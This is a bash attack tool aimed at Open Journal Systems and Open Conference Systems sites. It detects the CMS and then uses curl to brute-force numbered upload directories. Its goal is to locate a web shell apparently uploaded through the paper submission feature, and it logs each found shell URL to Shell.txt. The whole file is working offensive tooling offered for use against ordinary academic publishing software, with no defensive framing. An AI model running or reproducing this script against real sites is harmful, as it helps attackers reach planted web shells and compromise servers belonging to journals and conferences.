#!/bin/bash

clear

ocs(){
		OcsWeb=$1
		OcsID=$2
		OcsFilename=$3
		for (( i = 0; i < 100; i++ )); do
			local SearchDir=$(curl -s -I "$OcsWeb/files/conferences/$i/schedConfs/")
			if [[ $SearchDir =~ "403 Forbidden" ]] || [[ $SearchDir =~ "200 OK" ]]; then
				for (( ii = 0; ii < 100; ii++ )); do
					local SearchDirr=$(curl -s -I "$OcsWeb/files/conferences/$i/schedConfs/$ii/papers/$OcsID/")
					if [[ $SearchDirr =~ "403 Forbidden" ]] || [[ $SearchDirr =~ "200 OK" ]]; then
						printf "[+] FOUND : $i/schedConfs/$ii/papers/$OcsID/\n"
						echo "$OcsWeb/files/conferences/$i/schedConfs/$ii/papers/$OcsID/" >> 403.txt
						printf "[!] Searching shell with id [$OcsID] and name [$OcsFilename]\n"
						local ScanShell=$(curl -s -I "$OcsWeb/files/conferences/$i/schedConfs/$ii/papers/$OcsID/submission/original/$OcsFilename")
						if [[ $ScanShell =~ "200 OK" ]]; then
							printf "[+] FOUND : $OcsWeb/files/conferences/$i/schedConfs/$ii/papers/$OcsID/submission/original/$OcsFilename\n"
							echo "$OcsWeb/files/conferences/$i/schedConfs/$ii/papers/$OcsID/submission/original/$OcsFilename" >> Shell.txt
						else
							printf "[-] NOT FOUND\n"
							printf "[!] You can Search it Manually\n"
							exit 1
						fi
					fi
				done
			fi
		done
}
ojs(){
		OjsWeb=$1
		OjsID=$2
		OjsFilename=$3
		for (( i = 0; i < 200; i++ )); do
			local SearchDir=$(curl -s -I "$OjsWeb/files/journals/$i/articles/")
			if [[ $SearchDir =~ "403 Forbidden" ]] || [[ $SearchDir =~ "200 OK" ]]; then
					local SearchDirr=$(curl -s -I "$OjsWeb/files/journals/$i/articles/$OjsID/")
					if [[ $SearchDirr =~ "403 Forbidden" ]] || [[ $SearchDirr =~ "200 OK" ]]; then
						printf "[+] FOUND : $i/articles/$OjsID/\n"
						echo "$OjsWeb/files/journals/$i/articles/$OjsID/" >> Path.txt
						printf "[!] Searching shell with id [$OjsID] and name [$OjsFilename]\n"
						local ScanShell=$(curl -s -I "$OjsWeb/files/journals/$i/articles/$OjsID/submission/original/$OjsFilename")
						if [[ $ScanShell =~ "200 OK" ]]; then
							printf "[+] FOUND : $OjsWeb/files/journals/$i/articles/$OjsID/submission/original/$OjsFilename\n"
							echo "$OjsWeb/files/journals/$i/articles/$OjsID/submission/original/$OjsFilename" >> Shell.txt
							exit 1
						else
							printf "[-] NOT FOUND\n"
							printf "[!] You can Search it Manually\n"
							exit 1
						fi
					fi
			fi
		done

}

cek_cms(){
		local link=$1
		printf "[!] CMS : "
		checking=$(curl -s "$link" -L)
		if [[ $checking =~ "pkp.sfu.ca/ojs/" ]]; then
			printf "OJS\n"
			local ojsid=$2
			local ojsfile=$3
			printf "[!] Searching Directory\n"
			ojs $link $ojsid $ojsfile
		elif [[ $checking =~ "pkp.sfu.ca/ocs/" ]]; then
			printf "OCS\n"
			local ocsid=$2
			local ocsfile=$3
			printf "[!] Searching Directory\n"
			ocs $link $ocsid $ocsfile
		else
			printf "NOT OJS/OCS\n\n"
			exit 1
		fi
}

if [[ -z $3 ]]; then
	printf "For Use : ./$0 <http://target.com/[PATH]> <id> <filename>\n"
	exit 1
fi

id=$2
file=$3

for sites in $1; do
	printf "Scanning $sites\n"
	cek_cms $sites $id $file
done